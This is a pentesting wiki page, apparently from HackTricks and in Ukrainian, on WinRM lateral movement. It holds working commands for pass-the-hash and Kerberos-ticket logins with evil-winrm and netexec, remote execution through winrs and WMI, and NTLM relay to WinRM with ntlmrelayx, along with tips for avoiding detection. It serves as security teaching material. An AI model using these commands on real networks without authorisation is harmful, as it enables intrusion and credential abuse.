# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM є одним із найзручніших транспортів для **lateral movement** у середовищах Windows, бо дає віддалену shell через **WS-Man/HTTP(S)** без потреби в трюках із створенням SMB service. Якщо ціль відкриває **5985/5986** і ваш principal має право використовувати remoting, ви часто можете дуже швидко перейти від "valid creds" до "interactive shell".

Для **protocol/service enumeration**, listeners, увімкнення WinRM, `Invoke-Command` і загального використання client, дивіться:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Why operators like WinRM

- Використовує **HTTP/HTTPS** замість SMB/RPC, тому часто працює там, де execution у стилі PsExec заблоковано.
- З **Kerberos** він не надсилає до цілі reusable credentials.
- Працює чисто з інструментів для **Windows**, **Linux** і **Python** (`winrs`, `evil-winrm`, `pypsrp`, `netexec`).
- Interactive PowerShell remoting запускає **`wsmprovhost.exe`** на цілі в контексті authenticated user, що operationally відрізняється від service-based exec.

## Access model and prerequisites

На практиці успішний WinRM lateral movement залежить від **трьох** речей:

1. На цілі є **WinRM listener** (`5985`/`5986`) і firewall rules, які дозволяють доступ.
2. Обліковий запис може **authenticate** до endpoint.
3. Обліковий запис має право **open a remoting session**.

Поширені способи отримати цей доступ:

- **Local Administrator** на цілі.
- Membership у **Remote Management Users** на новіших системах або **WinRMRemoteWMIUsers__** на системах/компонентах, які досі враховують цю групу.
- Explicit remoting rights, делеговані через local security descriptors / зміни PowerShell remoting ACL.

Якщо ви вже контролюєте box з admin rights, пам’ятайте, що також можна **delegate WinRM access without full admin group membership** за допомогою технік, описаних тут:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Authentication gotchas that matter during lateral movement

- **Kerberos requires a hostname/FQDN**. Якщо підключатися по IP, client зазвичай fallback-иться на **NTLM/Negotiate**.
- У випадках **workgroup** або cross-trust edge cases, NTLM зазвичай вимагає або **HTTPS**, або додавання target до **TrustedHosts** на client.
- Для **local accounts** через Negotiate у workgroup, UAC remote restrictions можуть блокувати доступ, якщо не використовується вбудований Administrator account або не встановлено `LocalAccountTokenFilterPolicy=1`.
- PowerShell remoting за замовчуванням використовує **`HTTP/<host>` SPN**. У середовищах, де `HTTP/<host>` уже зареєстровано за іншим service account, WinRM Kerberos може завершитися з помилкою `0x80090322`; використайте SPN із портом або перейдіть на **`WSMAN/<host>`**, де такий SPN існує.

Якщо ви отримали valid credentials під час password spraying, перевірка їх через WinRM часто є найшвидшим способом дізнатися, чи дадуть вони shell:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Linux-to-Windows lateral movement

### NetExec / CrackMapExec for validation and one-shot execution
```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```
### Evil-WinRM для інтерактивних shell

`evil-winrm` залишається найзручнішим інтерактивним варіантом з Linux, оскільки підтримує **passwords**, **NT hashes**, **Kerberos tickets**, **client certificates**, передачу файлів і завантаження PowerShell/.NET в пам’ять.
```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```
### Kerberos SPN edge case: `HTTP` vs `WSMAN`

Коли типовий **`HTTP/<host>`** SPN спричиняє збої Kerberos, спробуйте запитати/використати замість нього квиток **`WSMAN/<host>`**. Це трапляється в hardened або дивних enterprise-налаштуваннях, де **`HTTP/<host>`** вже прив’язаний до іншого service account.
```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```
Це також корисно після зловживання **RBCD / S4U**, коли ви спеціально підробили або запросили **WSMAN** service ticket замість загального `HTTP` ticket.

### Certificate-based authentication

WinRM також підтримує **client certificate authentication**, але certificate має бути зіставлений на цілі з **local account**. З offensive perspective це важливо, коли:

- ви вже викрали/експортували valid client certificate і private key, що вже mapped для WinRM;
- ви зловживали **AD CS / Pass-the-Certificate**, щоб отримати certificate для principal, а потім перейти в інший authentication path;
- ви працюєте в environments, які навмисно уникають password-based remoting.
```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```
Client-certificate WinRM значно менш поширений, ніж password/hash/Kerberos auth, але коли він існує, він може надати шлях **passwordless lateral movement**, який переживає ротацію пароля.

### Python / automation з `pypsrp`

Якщо вам потрібна automation замість operator shell, `pypsrp` надає WinRM/PSRP з Python із підтримкою **NTLM**, **certificate auth**, **Kerberos** і **CredSSP**.
```python
from pypsrp.client import Client

client = Client(
"srv01.domain.local",
username="DOMAIN\\user",
password="Password123!",
ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```
## Windows-native WinRM lateral movement

### `winrs.exe`

`winrs.exe` вбудований і корисний, коли вам потрібне **native WinRM виконання команд** без відкриття інтерактивної PowerShell remoting сесії:
```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```
Оперативно, `winrs.exe` зазвичай призводить до ланцюга віддалених процесів, подібного до:
```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```
Це варто запам’ятати, оскільки це відрізняється від service-based exec і від interactive PSRP sessions.

### `winrm.cmd` / WS-Man COM instead of PowerShell remoting

Ви також можете виконувати через **WinRM transport** без `Enter-PSSession`, викликаючи WMI classes через WS-Man. Це зберігає transport як WinRM, тоді як віддалений execution primitive стає **WMI `Win32_Process.Create`**:
```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```
Такий підхід корисний, коли:

- PowerShell logging сильно моніториться.
- Вам потрібен **WinRM transport**, але не класичний PS remoting workflow.
- Ви створюєте або використовуєте custom tooling навколо **`WSMan.Automation`** COM object.

## NTLM relay to WinRM (WS-Man)

Коли SMB relay блокується signing-ом, а LDAP relay обмежений, **WS-Man/WinRM** все ще може бути привабливою relay target. Сучасний `ntlmrelayx.py` включає **WinRM relay servers** і може relay-ити до **`wsman://`** або **`winrms://`** targets.
```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```
Два практичні зауваження:

- Relay найкорисніший, коли ціль приймає **NTLM** і relayed principal має право використовувати WinRM.
- Нещодавній код Impacket спеціально обробляє запити **`WSMANIDENTIFY: unauthenticated`**, тож перевірки на кшталт `Test-WSMan` не ламають relay flow.

Для обмежень multi-hop після отримання першої WinRM session, дивіться:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## OPSEC and detection notes

- **Interactive PowerShell remoting** зазвичай створює **`wsmprovhost.exe`** на цілі.
- **`winrs.exe`** зазвичай створює **`winrshost.exe`**, а потім запитаний дочірній process.
- Очікуйте telemetry **network logon**, події WinRM service і PowerShell operational/script-block logging, якщо використовуєте PSRP замість raw `cmd.exe`.
- Якщо вам потрібна лише одна команда, `winrs.exe` або одноразове виконання через WinRM може бути тихішим, ніж довгоживуча interactive remoting session.
- Якщо Kerberos доступний, надавайте перевагу **FQDN + Kerberos** над IP + NTLM, щоб зменшити як проблеми довіри, так і незручні зміни `TrustedHosts` на боці client.

## References

- [Evil-WinRM README](https://github.com/Hackplayers/evil-winrm)
- [Microsoft: Error `0x80090322` when connecting PowerShell to a remote server via WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)

{{#include ../../banners/hacktricks-training.md}}
